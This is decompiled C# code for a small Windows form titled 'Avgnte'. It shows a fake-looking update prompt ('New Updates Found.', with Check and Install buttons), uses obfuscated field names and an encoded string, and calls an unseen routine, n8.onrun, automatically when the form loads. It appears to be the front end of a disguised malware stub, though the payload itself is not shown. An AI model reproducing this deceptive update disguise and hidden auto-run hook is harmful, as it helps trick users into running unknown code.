using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Avgnte;

[DesignerGenerated]
public class Avgnte : Form
{
	private IContainer components;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	private int ER77hm6A7aWfkmyOeo;

	private int JlsVeeiGzNiNU6Q4uvd7N1zI31Sb;

	private long j9Do34LVdEn68Up31992qpl;

	private long aUW3z3p6TFq4YIySleE;

	private string DgEw4fZU355108c96v885THpIm;

	private decimal e9t2DRnV71aT50sR9joJ8gFsk7e;

	private bool v6nI48iqP;

	internal virtual Panel Panel1
	{
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual ListBox ListBox1
	{
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	public Avgnte()
	{
		((Form)this).add_Load((EventHandler)Avgnte_Load);
		ER77hm6A7aWfkmyOeo = 615;
		JlsVeeiGzNiNU6Q4uvd7N1zI31Sb = 793197572;
		j9Do34LVdEn68Up31992qpl = 3796047L;
		aUW3z3p6TFq4YIySleE = 5L;
		DgEw4fZU355108c96v885THpIm = "wRDDM.5fDp\\SRNJ=„~`…kQS&‡_nLo9ePeˆŠ5YdUmqB5P9\u007f‚Œ;‚Un‹X7F‘>O€R{‰+*+€\\W4v?I†4I;#\u007f(pt0€wŠX-qd7:5g:ˆL*F.‘EU'+5E$D\u0081*ŽQF0qj)F2es}†\u0090\\*tl?\u00901pq*K?)tbeS|‚Z<{‚W\\=Bv3[>Zb)b+cK$„‹=s;xQa";
		e9t2DRnV71aT50sR9joJ8gFsk7e = new decimal(11954L);
		v6nI48iqP = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_02f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0301: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Avgnte));
		Panel1 = new Panel();
		Button2 = new Button();
		Button1 = new Button();
		ListBox1 = new ListBox();
		ProgressBar1 = new ProgressBar();
		((Control)Panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)Panel1).get_Controls().Add((Control)(object)Button2);
		((Control)Panel1).get_Controls().Add((Control)(object)Button1);
		((Control)Panel1).get_Controls().Add((Control)(object)ListBox1);
		((Control)Panel1).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)Panel1).set_Dock((DockStyle)5);
		Panel panel = Panel1;
		Point location = new Point(0, 0);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		Size size = new Size(322, 112);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(0);
		Button button = Button2;
		location = new Point(179, 50);
		((Control)button).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button2 = Button2;
		size = new Size(88, 23);
		((Control)button2).set_Size(size);
		((Control)Button2).set_TabIndex(3);
		((ButtonBase)Button2).set_Text("Install");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button button3 = Button1;
		location = new Point(179, 20);
		((Control)button3).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button4 = Button1;
		size = new Size(88, 23);
		((Control)button4).set_Size(size);
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Check");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox1.get_Items().AddRange(new object[1] { "New Updates Found." });
		ListBox listBox = ListBox1;
		location = new Point(28, 20);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		size = new Size(114, 56);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(1);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(17, 89);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(288, 11);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(0);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(322, 112);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Avgnte");
		((Form)this).set_Text("Avgnte");
		((Control)Panel1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}

	private void Avgnte_Load(object sender, EventArgs e)
	{
		n8.onrun(Conversions.ToString(true));
	}
}
